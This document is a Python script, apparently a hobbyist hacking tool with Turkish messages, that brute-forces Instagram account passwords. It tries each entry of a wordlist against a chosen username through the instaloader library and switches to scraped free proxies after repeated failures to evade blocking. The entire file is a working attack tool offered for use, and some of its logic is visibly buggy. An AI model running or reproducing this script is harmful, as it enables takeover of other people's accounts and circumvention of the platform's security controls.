
import sys
import requests
import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from bs4 import BeautifulSoup
from random import choice
import shutil

programPath = os.path.abspath(__file__)
programDirectory = os.path.dirname(programPath)


codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

wlflag = False
def GetProxy():
    url = 'https://www.sslproxies.org'
    r = requests.get(url)
    soup = BeautifulSoup(r.content, 'html5lib')
    return {'https': choice(list(map(lambda x: x[0]+':'+x[1],list(zip(list(map(lambda x: x.text, soup.find_all('td')[::8])), (map(lambda x: x.text, soup.find_all('td')[1::8])))))))}

def UseProxy(url):
    while True:
        try:
            proxy = GetProxy()
            a = str(proxy)
            r = requests.get(url,proxies=proxy,timeout=5)
            if r.status_code == 200:
                break
        except:
            pass
    return a[11:len(a)-2]



def kopyala():
    wl = programDirectory + "/testo.txt"
    kopya_dosya = programDirectory+"/kopya.txt"
    i = 1
    while True:
        try:
            shutil.copy2(wl, kopya_dosya)
            break
        except shutil.Error:
            i += 1
            kopya_dosya = "kopya-{}-{}.txt".format(i, wl)
def temizle(ps):
    dosya_adi = programDirectory+"/kopya.txt"
    aranan_satir = ps
    with open(dosya_adi, 'r') as dosya:
        satirlar = dosya.readlines()
    for i, satir in enumerate(satirlar):
        if aranan_satir in satir:
            satirlar = satirlar[i:]
            break
    with open(dosya_adi, 'w') as dosya:
        dosya.writelines(satirlar)

def saldiri(usr):
    flagg = True
    USER = usr
    wl = programDirectory + "/testo.txt"
    if wlflag == True:
        wl = programDirectory+"/kopya.txt"
    file1 = open(wl, 'r')
    Lines = file1.readlines()
    count = 0

    urlP = 'https://api.ipify.org/'

    failed_attempts = 0
    use_proxy = False 
    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(2) 
            print("*Deneniyor "+pstest)
            if use_proxy:
                # use proxy if flag is set
                session = requests.Session()
                session.proxies = UseProxy(urlP)
                L.context._session = session
            L.login(USER, PASSWORD)
            print("*Şifre: {}".format(pstest))
            kopyala()
            temizle(PASSWORD)
            flagg = False
            veri_break = "si"
            break
        except instaloader.exceptions.BadCredentialsException:
            print("*Yanlış Şifre: "+pstest)
            failed_attempts += 1
            if failed_attempts >= 2:
                use_proxy = True
                failed_attempts = 0 
                print("*Proxy değiştiriliyor...")
        except instaloader.exceptions.ConnectionException:
            kopyala()
            temizle(PASSWORD)
            print("*{} Doğrulamaya takıldı".format(pstest))
            flagg = False
            break
        except instaloader.exceptions.InvalidArgumentException:
            print("*{} Kullanıcı adı bulunamadı".format(USER))
    file1.close()
    if flagg == False:
        return pstest
    else:
        return "aha sen bu şifreyi nah bulursun hahaha"

def saldir2(usr):  
    flagg = True
    USER = usr
    wl = programDirectory + "/kopya.txt"
    if wlflag == True:
        wl = programDirectory+"/kopya.txt"
    file1 = open(wl, 'r')
    Lines = file1.readlines()
    count = 0

    urlP = 'https://api.ipify.org/'

    failed_attempts = 0
    use_proxy = False 
    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(2) 
            print("*Deneniyor "+pstest)
            if use_proxy:
                # use proxy if flag is set
                session = requests.Session()
                session.proxies = UseProxy(urlP)
                L.context._session = session
            L.login(USER, PASSWORD)
            print("*Şifre: {}".format(pstest))
            kopyala()
            temizle(PASSWORD)
            flagg = False
            veri_break = "si"
            break
        except instaloader.exceptions.BadCredentialsException:
            print("*Yanlış Şifre: "+pstest)
            failed_attempts += 1
            if failed_attempts >= 2:
                use_proxy = True
                failed_attempts = 0 
                print("*Proxy değiştiriliyor...")
        except instaloader.exceptions.ConnectionException:
            kopyala()
            temizle(PASSWORD)
            print("*{} Doğrulamaya takıldı".format(pstest))
            flagg = False
            break
        except instaloader.exceptions.InvalidArgumentException:
            print("*{} Kullanıcı adı bulunamadı".format(USER))
    file1.close()
    if flagg == False:
        return pstest
    else:
        return "nono"

print('''
_________ _        _______  _______  _______  _______  _______ 
\__   __/( (    /|(  ____ \(  ____ )(  ____ )(  ____ \(  ____ )
   ) (   |  \  ( || (    \/| (    )|| (    )|| (    \/| (    )|
   | |   |   \ | || (_____ | (____)|| (____)|| (__    | (____)|
   | |   | (\ \) |(_____  )|  _____)|  _____)|  __)   |     __)
   | |   | | \   |      ) || (      | (      | (      | (\ (   
___) (___| )  \  |/\____) || )      | )      | (____/\| ) \ \__
\_______/|/    )_)\_______)|/       |/       (_______/|/   \__/
                                                               

    ''')
print("*┈──╌ BY LonVost ╌──┈*")

broke = 0
while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input('*Kullanıcı adı: ')
    wldevam = input("Aynı kullanıcı için devam et(y/n): ")
    if wldevam.lower == "y".lower:
        a = saldir2(USER)
        b=""
        if a != "nono":
            if a != b:
                wlflag = True
                wl2flg = False
                b=saldir2(USER)
            if a == b:
                print("* Şifre bulundu: "+a)
                break
        else:
            print("*Şifre Bulunamadı...")
            break
    else:
        a = saldiri(USER)
        b=""
        if a != "nono":
            if a != b:
                wlflag = True
                wl2flg = False
                b=saldiri(USER)
            if a == b:
                print("* Şifre bulundu: "+a)
                break
        else:
            print("*Şifre Bulunamadı...")
            break
    sleepp = 0




L.close()
print("*Brute Force Tamamlandı..!!")
exit()
